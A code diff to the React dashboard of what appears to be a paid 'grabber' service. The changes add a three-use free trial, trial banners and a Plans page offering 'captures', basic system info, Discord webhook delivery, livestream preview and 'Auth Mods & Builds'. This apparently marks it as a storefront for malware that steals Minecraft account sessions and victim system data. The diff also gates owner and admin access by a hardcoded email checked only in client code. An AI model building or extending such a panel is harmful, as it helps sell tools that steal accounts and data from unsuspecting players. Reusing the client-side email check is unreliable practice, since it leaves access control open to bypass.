@@ -10,6 +10,7 @@ const colors = {
   text: '#f0f0f0',
   textDim: '#6b6e7b',
   green: '#22c55e',
+  blue: '#3b82f6',
 };
 
 function NavItem({ icon, label, active, onClick }) {
@@ -28,7 +29,7 @@ function NavItem({ icon, label, active, onClick }) {
   );
 }
 
-function Dashboard({ userEmail }) {
+function Dashboard({ userEmail, freeUses, isPro, trialExhausted }) {
   const [grabCount, setGrabCount] = useState(0);
   const [mcUsername, setMcUsername] = useState('');
   const [mcSaved, setMcSaved] = useState(false);
@@ -58,10 +59,24 @@ function Dashboard({ userEmail }) {
     if (res.ok) setMcSaved(true);
   };
 
+  const isOwner = userEmail === 'lifegrading@gmail.com';
+  const showTrialBadge = !isPro && !isOwner && freeUses !== null && freeUses !== undefined;
+
   return (
     <div className="page-enter" style={{ flex: 1, padding: '28px 36px' }}>
       <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Good evening.</h1>
       <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4, marginBottom: 24 }}>Your workspace is ready.</p>
+      {showTrialBadge && (
+        <div style={{ marginBottom: 24, padding: '12px 16px', background: 'rgba(59, 130, 246, 0.08)', border: '1px solid ' + colors.blue, borderRadius: 8, fontSize: 13, color: colors.text }}>
+          <strong style={{ color: colors.blue }}>Free Trial:</strong> {freeUses} of 3 uses remaining
+          {trialExhausted && <span style={{ color: colors.red || '#ef4444', marginLeft: 8 }}>— Upgrade to Pro for unlimited captures</span>}
+        </div>
+      )}
+      {trialExhausted && (
+        <div style={{ marginBottom: 24, padding: '12px 16px', background: 'rgba(239, 68, 68, 0.08)', border: '1px solid #ef4444', borderRadius: 8, fontSize: 13, color: colors.text }}>
+          <strong style={{ color: '#ef4444' }}>Free trial exhausted.</strong> Upgrade to Pro for unlimited captures.
+        </div>
+      )}
       <div style={{ display: 'flex', gap: 14, marginBottom: 24 }}>
         {[
           { icon: '👤', label: 'GRABS', value: String(grabCount), sub: grabCount === 0 ? 'No grabs yet' : `${grabCount} total captures` },
@@ -120,23 +135,58 @@ function Dashboard({ userEmail }) {
 
 
 
-function Plans() {
+function Plans({ freeUses, isPro, trialExhausted }) {
   return (
     <div className="page-enter" style={{ flex: 1, padding: '28px 36px' }}>
-      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Plans</h1>
-      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Upgrade to unlock more features.</p>
-      <div style={{ maxWidth: 400 }}>
-        <div className="glass-card" style={{ border: '1px solid rgba(34, 197, 94, 0.3)', borderRadius: 12, padding: 28, position: 'relative' }}>
-          <div style={{ position: 'absolute', top: -10, left: 20, background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '3px 10px', borderRadius: 8 }}>PRO</div>
-          <div style={{ fontSize: 12, color: colors.green, letterSpacing: 1, marginBottom: 6, fontWeight: 600 }}>👑 ULTIMATE GRABS</div>
-          <div style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>$5</div>
-          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 20 }}>/ month</div>
-          {['Unlimited sessions', 'Permanent data retention', 'Webhook notifications', 'Auth Mods & Builds', 'Priority support'].map((f, i) => (
-            <div key={i} style={{ fontSize: 13, color: colors.text, marginBottom: 8, display: 'flex', gap: 8 }}>
-              <span style={{ color: colors.green }}>✓</span> {f}
-            </div>
-          ))}
-          <button disabled className="btn-smooth" style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, opacity: 0.5, cursor: 'not-allowed' }}>Coming Soon</button>
+      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24 }}>
+        <div>
+          <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Plans</h1>
+          <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4 }}>Choose a plan that works for you.</p>
+        </div>
+      </div>
+      <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start' }}>
+        <div style={{ flex: 1, maxWidth: 400 }}>
+          <div className="glass-card" style={{ border: '1px solid rgba(59, 130, 246, 0.3)', borderRadius: 12, padding: 28, position: 'relative' }}>
+            <div style={{ position: 'absolute', top: -10, left: 20, background: colors.blue, color: '#fff', fontSize: 10, fontWeight: 700, padding: '3px 10px', borderRadius: 8 }}>FREE TRIAL</div>
+            <div style={{ fontSize: 12, color: colors.blue, letterSpacing: 1, marginBottom: 6, fontWeight: 600 }}>🚀 GET STARTED</div>
+            <div style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>$0</div>
+            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 20 }}>One-time, no card needed</div>
+            {['3 captures included', 'Basic system info', 'Discord webhook', 'Livestream preview'].map((f, i) => (
+              <div key={i} style={{ fontSize: 13, color: colors.text, marginBottom: 8, display: 'flex', gap: 8 }}>
+                <span style={{ color: colors.blue }}>✓</span> {f}
+              </div>
+            ))}
+            {trialExhausted ? (
+              <button disabled className="btn-smooth" style={{ width: '100%', marginTop: 16, padding: '10px 0', background: '#333', color: colors.textDim, border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'not-allowed' }}>
+                Trial used up
+              </button>
+            ) : (
+              <button onClick={() => window.location.href = '/dashboard'} className="btn-smooth" style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.blue, color: '#fff', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>
+                {freeUses !== null && freeUses !== undefined ? `${freeUses} uses left` : 'Get Started'}
+              </button>
+            )}
+          </div>
+        </div>
+
+        <div style={{ flex: 1, maxWidth: 400 }}>
+          <div className="glass-card" style={{ border: '1px solid rgba(34, 197, 94, 0.3)', borderRadius: 12, padding: 28, position: 'relative' }}>
+            <div style={{ position: 'absolute', top: -10, left: 20, background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '3px 10px', borderRadius: 8 }}>PRO</div>
+            <div style={{ fontSize: 12, color: colors.green, letterSpacing: 1, marginBottom: 6, fontWeight: 600 }}>👑 ULTIMATE GRABS</div>
+            <div style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>$5</div>
+            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 20 }}>/ month</div>
+            {['Unlimited sessions', 'Permanent data retention', 'Webhook notifications', 'Auth Mods & Builds', 'Priority support'].map((f, i) => (
+              <div key={i} style={{ fontSize: 13, color: colors.text, marginBottom: 8, display: 'flex', gap: 8 }}>
+                <span style={{ color: colors.green }}>✓</span> {f}
+              </div>
+            ))}
+            {isPro ? (
+              <button disabled className="btn-smooth" style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, opacity: 0.5, cursor: 'not-allowed' }}>Active</button>
+            ) : (
+              <button onClick={() => window.location.href = '/dashboard'} className="btn-smooth" style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>
+                Upgrade to Pro
+              </button>
+            )}
+          </div>
         </div>
       </div>
     </div>
@@ -423,6 +473,8 @@ export default function DashboardPage() {
   const [page, setPage] = useState('dashboard');
   const [user, setUser] = useState(null);
   const [isPro, setIsPro] = useState(false);
+  const [freeUses, setFreeUses] = useState(null);
+  const [trialExhausted, setTrialExhausted] = useState(false);
   const [proChecked, setProChecked] = useState(false);
   const router = useRouter();
 
@@ -438,7 +490,12 @@ export default function DashboardPage() {
           } else {
             fetch('/api/user/pro')
               .then(r => r.json())
-              .then(p => { setIsPro(p.is_pro); setProChecked(true); })
+              .then(p => {
+                setIsPro(p.is_pro);
+                setFreeUses(p.free_uses_remaining);
+                setTrialExhausted(p.trial_exhausted || false);
+                setProChecked(true);
+              })
               .catch(() => { setIsPro(false); setProChecked(true); });
           }
         } else {
@@ -450,6 +507,7 @@ export default function DashboardPage() {
 
   const username = user?.name || 'You';
   const userEmail = user?.email || '';
+  const isOwner = userEmail === 'lifegrading@gmail.com';
 
   if (!proChecked) {
     return (
@@ -459,15 +517,18 @@ export default function DashboardPage() {
     );
   }
 
-  if (!isPro && userEmail !== 'lifegrading@gmail.com') {
+  const canAccess = isPro || isOwner || freeUses > 0;
+
+  if (!canAccess) {
     return (
       <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
         <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16 }}>
           <div style={{ fontSize: 48 }}>🔒</div>
-          <div style={{ fontSize: 18, fontWeight: 600 }}>Pro Required</div>
+          <div style={{ fontSize: 18, fontWeight: 600 }}>Free Trial Exhausted</div>
           <div style={{ fontSize: 14, color: colors.textDim, textAlign: 'center', maxWidth: 400 }}>
-            You need a Pro license to access the dashboard. Contact the admin to get access.
+            You have used all 3 free captures. Upgrade to Pro for unlimited access.
           </div>
+          <button onClick={() => setPage('plans')} style={{ cursor: 'pointer', background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 20px', fontSize: 13, fontWeight: 600 }}>Upgrade to Pro</button>
           <div onClick={() => window.location.href = '/api/auth/logout'} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginTop: 8 }}>
             Log out
           </div>
@@ -487,7 +548,7 @@ export default function DashboardPage() {
           <NavItem icon="📊" label="Dashboard" active={page === 'dashboard'} onClick={() => setPage('dashboard')} />
           <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
           <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
-          {userEmail === 'lifegrading@gmail.com' && (
+          {!isPro && isOwner && (
             <NavItem icon="👥" label="Admin" onClick={() => router.push('/admin')} />
           )}
           <NavItem icon="📋" label="Plans" active={page === 'plans'} onClick={() => setPage('plans')} />
@@ -500,8 +561,8 @@ export default function DashboardPage() {
           <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
         </div>
       </aside>
-      {page === 'dashboard' && <Dashboard userEmail={userEmail} />}
-      {page === 'plans' && <Plans />}
+      {page === 'dashboard' && <Dashboard userEmail={userEmail} freeUses={freeUses} isPro={isPro} trialExhausted={trialExhausted} />}
+      {page === 'plans' && <Plans freeUses={freeUses} isPro={isPro} trialExhausted={trialExhausted} />}
       {page === 'rep' && <RepPage username={username} userEmail={userEmail} />}
       {page === 'live' && <LiveCaptures />}
     </div>
